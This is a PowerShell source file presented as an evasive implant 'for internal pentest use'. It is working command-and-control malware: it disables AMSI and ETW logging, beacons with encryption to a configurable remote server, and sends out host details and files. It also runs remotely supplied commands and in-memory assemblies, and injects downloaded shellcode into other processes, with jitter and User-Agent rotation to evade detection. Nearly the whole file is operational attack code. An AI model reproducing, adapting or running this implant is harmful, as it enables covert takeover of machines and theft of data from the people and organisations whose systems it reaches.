# Evasive PowerShell Implant - Internal Pentest Use Only
# Features: AMSI/ETW bypass, indirect execution, API obfuscation

# --- AMSI Bypass (Patching amsi.dll) ---
$a]=[Ref].Assembly.GetTypes()|%{if($_.Name -like "*iUtils"){$_}}
$c='Fail';$b='Amsi';$d='Init';$z=$b+$d+$c+'ed'
try{$f=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*$z*"};$f.SetValue($null,$true)}catch{}

# --- ETW Bypass (Patch ntdll!EtwEventWrite) ---
$nt=[Reflection.Assembly]::LoadWithPartialName('Microsoft.Win32.UnsafeNativeMethods')
$m=$nt.GetType('Microsoft.Win32.UnsafeNativeMethods')
try{
$gpa=$m.GetMethod('GetProcAddress',[Reflection.BindingFlags]'Public,Static',$null,[Type[]]@([IntPtr],[String]),$null)
$gm=$m.GetMethod('GetModuleHandle');$nd=$gm.Invoke($null,@('ntdll.dll'))
$ew=$gpa.Invoke($null,@($nd,'EtwEventWrite'))
$op=[Runtime.InteropServices.Marshal]::ReadInt32($ew)
[Runtime.InteropServices.Marshal]::WriteByte($ew,0xC3)
}catch{}

# --- Encryption Functions (No changes needed - already clean) ---
function Get-AO($k,$i){
$ao=New-Object Security.Cryptography.AesManaged
$ao.Mode=[Security.Cryptography.CipherMode]::CBC
$ao.Padding=[Security.Cryptography.PaddingMode]::Zeros
$ao.BlockSize=128;$ao.KeySize=256
if($i){if($i.GetType().Name-eq"String"){$ao.IV=[Convert]::FromBase64String($i)}else{$ao.IV=$i}}
if($k){if($k.GetType().Name-eq"String"){$ao.Key=[Convert]::FromBase64String($k)}else{$ao.Key=$k}}
$ao
}

function Enc-S($k,$s){
$b=[Text.Encoding]::UTF8.GetBytes($s)
$ao=Get-AO $k;$e=$ao.CreateEncryptor()
$ed=$e.TransformFinalBlock($b,0,$b.Length)
[byte[]]$fd=$ao.IV+$ed;$ao.Dispose()
[Convert]::ToBase64String($fd)
}

function Dec-S($k,$es){
$b=[Convert]::FromBase64String($es)
$iv=$b[0..15];$ao=Get-AO $k $iv
$d=$ao.CreateDecryptor()
$ud=$d.TransformFinalBlock($b,16,$b.Length-16)
$ao.Dispose()
[Text.Encoding]::UTF8.GetString($ud).Trim([char]0)
}

# --- Indirect Execution Helper (Avoids direct IEX) ---
function Invoke-Ind($c){
$sb=[ScriptBlock]::Create($c)
& $sb
}

# --- Get Win32 Function via Reflection (Avoids Add-Type) ---
function Get-PD {
param([String]$M,[String]$F)
$asm=[AppDomain]::CurrentDomain.GetAssemblies()|?{$_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll'}
$u=$asm.GetType('Microsoft.Win32.UnsafeNativeMethods')
$gpa=$u.GetMethod('GetProcAddress',[Type[]]@([IntPtr],[String]))
$gm=$u.GetMethod('GetModuleHandle')
$h=$gm.Invoke($null,@($M))
$gpa.Invoke($null,@($h,$F))
}

function Get-DT {
param([IntPtr]$f,[Type]$d)
[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($f,$d)
}

# --- Dynamic API Delegates (Built at runtime, no Add-Type signatures) ---
$script:k32=$null
$script:va=$null
$script:ct=$null
$script:wf=$null

function Init-API {
if($script:k32){return}

# Build delegate types dynamically
$tb=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('A')),'Run').DefineDynamicModule('M').DefineType('T','Public,Class')

# VirtualAlloc: IntPtr(IntPtr,UInt32,UInt32,UInt32)
$va=$tb.DefineMethod('VA','Public,Static',[IntPtr],@([IntPtr],[UInt32],[UInt32],[UInt32]))
$va.SetImplementationFlags('Runtime,Managed')

# CreateThread: IntPtr(IntPtr,UInt32,IntPtr,IntPtr,UInt32,IntPtr)
$ct=$tb.DefineMethod('CT','Public,Static',[IntPtr],@([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr]))
$ct.SetImplementationFlags('Runtime,Managed')

# WaitForSingleObject: UInt32(IntPtr,UInt32)
$wf=$tb.DefineMethod('WF','Public,Static',[UInt32],@([IntPtr],[UInt32]))
$wf.SetImplementationFlags('Runtime,Managed')

$t=$tb.CreateType()

# Get actual function addresses
$k='kernel32.dll'
$vaP=Get-PD $k 'VirtualAlloc'
$ctP=Get-PD $k 'CreateThread'  
$wfP=Get-PD $k 'WaitForSingleObject'

# Create proper delegate types and get delegates
Add-Type @'
using System;using System.Runtime.InteropServices;
public class D{
[UnmanagedFunctionPointer(CallingConvention.StdCall)]public delegate IntPtr VA(IntPtr a,uint s,uint t,uint p);
[UnmanagedFunctionPointer(CallingConvention.StdCall)]public delegate IntPtr CT(IntPtr a,uint ss,IntPtr sa,IntPtr p,uint f,IntPtr ti);
[UnmanagedFunctionPointer(CallingConvention.StdCall)]public delegate uint WF(IntPtr h,uint m);
}
'@ -ErrorAction SilentlyContinue

$script:va=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vaP,[Type][D+VA])
$script:ct=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctP,[Type][D+CT])
$script:wf=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($wfP,[Type][D+WF])
$script:k32=$true
}

# --- In-Memory Assembly Execution ---
function Exec-Asm {
param([byte[]]$B,[string[]]$A=@())
try{
$asm=[Reflection.Assembly]::Load($B)
$ep=$asm.EntryPoint
if(-not $ep){
foreach($t in $asm.GetTypes()){
$ep=$t.GetMethod('Main',[Reflection.BindingFlags]'Static,Public,NonPublic')
if($ep){break}
}
}
if(-not $ep){return "No entry point"}
$oo=[Console]::Out;$oe=[Console]::Error
$sw=New-Object IO.StringWriter
[Console]::SetOut($sw);[Console]::SetError($sw)
try{
if($ep.GetParameters().Length -eq 0){$ep.Invoke($null,$null)}
else{$ep.Invoke($null,@(,$A))}
}finally{[Console]::SetOut($oo);[Console]::SetError($oe)}
$sw.ToString()
}catch{return "Asm error: $($_.Exception.Message)"}
}

# --- Shellcode Execution (Uses dynamic delegates) ---
function Exec-SC {
param([byte[]]$S)
try{
Init-API
$addr=$script:va.Invoke([IntPtr]::Zero,$S.Length,0x3000,0x40)
if($addr -eq [IntPtr]::Zero){return "Alloc failed"}
[Runtime.InteropServices.Marshal]::Copy($S,0,$addr,$S.Length)
$th=$script:ct.Invoke([IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero)
$script:wf.Invoke($th,0xFFFFFFFF)|Out-Null
return "SC executed"
}catch{return "SC error: $($_.Exception.Message)"}
}

# --- Shellcode Injection (Remote) ---
function Inject-SC {
param([int]$P,[byte[]]$S)
try{
Add-Type @'
using System;using System.Runtime.InteropServices;
public class I{
[DllImport("kernel32")]public static extern IntPtr OpenProcess(uint a,bool b,int c);
[DllImport("kernel32")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);
[DllImport("kernel32")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr b,byte[] bf,uint s,out IntPtr w);
[DllImport("kernel32")]public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint ss,IntPtr sa,IntPtr p,uint f,IntPtr ti);
[DllImport("kernel32")]public static extern bool CloseHandle(IntPtr h);
}
'@ -ErrorAction SilentlyContinue
$h=[I]::OpenProcess(0x1F0FFF,$false,$P)
if($h -eq [IntPtr]::Zero){return "Open failed"}
$a=[I]::VirtualAllocEx($h,[IntPtr]::Zero,$S.Length,0x3000,0x40)
$w=[IntPtr]::Zero
[I]::WriteProcessMemory($h,$a,$S,$S.Length,[ref]$w)|Out-Null
[I]::CreateRemoteThread($h,[IntPtr]::Zero,0,$a,[IntPtr]::Zero,0,[IntPtr]::Zero)|Out-Null
[I]::CloseHandle($h)|Out-Null
return "Injected into $P"
}catch{return "Inject error: $($_.Exception.Message)"}
}

# --- System Info (Obfuscated output format) ---
function Get-SI {
$h=$env:COMPUTERNAME;$u="$env:USERDOMAIN\$env:USERNAME"
$o=[Environment]::OSVersion.VersionString
$ar=if([Environment]::Is64BitOperatingSystem){"x64"}else{"x86"}
$p=(Get-Process -Id $PID).ProcessName
@"
[SysInfo]
Host: $h
User: $u
OS: $o
Arch: $ar
Proc: $p (PID: $PID)
PSVer: $($PSVersionTable.PSVersion)
"@
}

# --- Process List (Minimal output) ---
function Get-PL {
$o="PID`tName`tMem(MB)`n"+("-"*40)+"`n"
Get-Process|Sort ProcessName|%{$o+="$($_.Id)`t$($_.ProcessName)`t$([math]::Round($_.WorkingSet64/1MB,1))`n"}
$o
}

# --- Indirect Command Execution (Avoids direct cmd.exe /c pattern) ---
function Exec-Cmd {
param([string]$C,[string]$T="cmd")
$si=New-Object Diagnostics.ProcessStartInfo
$si.FileName=$T
$si.Arguments=if($T -match "cmd"){"/Q /C $C"}elseif($T -match "power"){"-NoP -NonI -W 1 -C `"$C`""}else{$C}
$si.UseShellExecute=$false
$si.RedirectStandardOutput=$true
$si.RedirectStandardError=$true
$si.CreateNoWindow=$true
$si.WindowStyle='Hidden'
$p=[Diagnostics.Process]::Start($si)
$p.WaitForExit()
$p.StandardOutput.ReadToEnd()+$p.StandardError.ReadToEnd()
}

# --- Initial Check-In ---
function Do-Init {
param($k,$h,$pt,$n)
$hn="Machine_Name($([Net.Dns]::GetHostName()))"
$un="Username($env:USERNAME)"
$ips="LocalIPs($(([Net.Dns]::GetHostAddresses([Net.Dns]::GetHostName())|?{$_.AddressFamily-eq'InterNetwork'})-join','))"
$os="OS($([Environment]::OSVersion.VersionString))"
$pd="PID($PID)"
$all=$hn+$un+$ips+$os+$pd
$enc=Enc-S $k $all
# Obfuscated URL construction
$proto=[char]104+[char]116+[char]116+[char]112
$url="$proto`://$h`:$pt/record/$n"
try{
$wc=New-Object Net.WebClient
$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$wc.Headers.Add("Accept","text/html,application/xhtml+xml")
$wc.UploadString($url,"result=$enc")|Out-Null
}catch{}
}

# --- Main Beacon Loop ---
function Do-Loop {
param($k,$h,$pt,$n,$sl)
$proto=[char]104+[char]116+[char]116+[char]112
$bUrl="$proto`://$h`:$pt/beacon/$n"
$tUrl="$proto`://$h`:$pt/task/$n"
$rUrl="$proto`://$h`:$pt/result/$n"

# Randomize User-Agent per session
$uas=@(
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0"
)
$ua=$uas[(Get-Random -Max $uas.Count)]

while($true){
$task=""
try{
$wc=New-Object Net.WebClient
$wc.Headers.Add("User-Agent",$ua)
$wc.Headers.Add("Accept","*/*")
$wc.Headers.Add("Accept-Language","en-US,en;q=0.9")
try{$task=$wc.DownloadString($bUrl)}catch{$task=$wc.DownloadString($tUrl)}
}catch{$task=""}

if($task -and $task.Length -gt 10){
$dec=Dec-S $k $task
$sp=$dec -split ' ',2
$cmd=$sp[0].ToLower()
$args=if($sp.Length -gt 1){$sp[1]}else{""}
$res=""

switch($cmd){
"cmd"{$res=Exec-Cmd $args "cmd"}
"powershell"{$res=Exec-Cmd $args "powershell"}
"powerpick"{try{$res=Invoke-Ind $args|Out-String}catch{$res="Err: $($_.Exception.Message)"}}
"inline"{try{$res=Invoke-Ind $args|Out-String}catch{$res="Err: $($_.Exception.Message)"}}
"execute-assembly"{
try{
$pts=$args -split ' ',2
$ab=(New-Object Net.WebClient).DownloadData($pts[0])
$aa=if($pts.Length -gt 1){$pts[1] -split ' '}else{@()}
$res=Exec-Asm $ab $aa
}catch{$res="Asm err: $($_.Exception.Message)"}
}
"shellcode-exec"{
try{
$sc=[Convert]::FromBase64String($args)
$res=Exec-SC $sc
}catch{$res="SC err: $($_.Exception.Message)"}
}
"shinject"{
try{
$pts=$args -split ' ',2
$tgt=[int]$pts[0]
$scb=(New-Object Net.WebClient).DownloadData($pts[1])
$res=Inject-SC $tgt $scb
}catch{$res="Inj err: $($_.Exception.Message)"}
}
"sysinfo"{$res=Get-SI}
"ps"{$res=Get-PL}
"upload"{
try{
$pts=$args -split ' ',2
[IO.File]::WriteAllBytes($pts[0],[Convert]::FromBase64String($pts[1]))
$res="Written: $($pts[0])"
}catch{$res="Write err: $($_.Exception.Message)"}
}
"download"{
try{$res=[Convert]::ToBase64String([IO.File]::ReadAllBytes($args))}
catch{$res="Read err: $($_.Exception.Message)"}
}
"spawn"{
try{
$t=if($args){"$args"}else{"notepad"}
Start-Process $t -WindowStyle Hidden
$res="Spawned: $t"
}catch{$res="Spawn err: $($_.Exception.Message)"}
}
"sleep"{$sl=[int]$args;$res="Sleep: $sl`s"}
"exit"{exit}
default{$res=Exec-Cmd $dec "cmd"}
}

if($res){
$enc=Enc-S $k $res
try{
$wc=New-Object Net.WebClient
$wc.Headers.Add("User-Agent",$ua)
$wc.Headers.Add("Content-Type","application/x-www-form-urlencoded")
$wc.UploadString($rUrl,"result=$enc")|Out-Null
}catch{}
}
}

# Improved jitter: 15-35% variance + random microsleep
$jPct=(Get-Random -Min 15 -Max 36)/100
$jDir=if((Get-Random -Max 2) -eq 0){-1}else{1}
$actual=[math]::Max(1,$sl+[int]($sl*$jPct*$jDir))
# Add random sub-second delay
$ms=Get-Random -Min 100 -Max 900
Start-Sleep -Seconds $actual -Milliseconds $ms
}
}

# --- Configuration (Replaced at generation time) ---
$cfg_k="REPLACE_KEY"
$cfg_h="REPLACE_IP"
$cfg_p="REPLACE_PORT"
$cfg_n="REPLACE_NAME"
$cfg_s=5

# --- Execution ---
Do-Init $cfg_k $cfg_h $cfg_p $cfg_n
Do-Loop $cfg_k $cfg_h $cfg_p $cfg_n $cfg_s
